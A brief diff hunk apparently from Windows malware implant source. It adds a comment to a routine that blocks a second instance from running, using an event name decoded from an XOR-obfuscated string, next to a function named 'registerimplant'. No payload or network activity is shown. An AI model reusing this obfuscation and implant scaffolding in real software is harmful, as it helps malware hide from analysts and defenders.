@@ -40,6 +40,7 @@ void registerimplant(void){
     return;
 }
 
+/*check if execution runs twice*/
 BOOL CheckInstance(){
     HANDLE  m_hStartEvent = CreateEventA( NULL, FALSE, FALSE,xor_string("RTWWTRZZY",0x15).c_str());
     if(m_hStartEvent == NULL) {
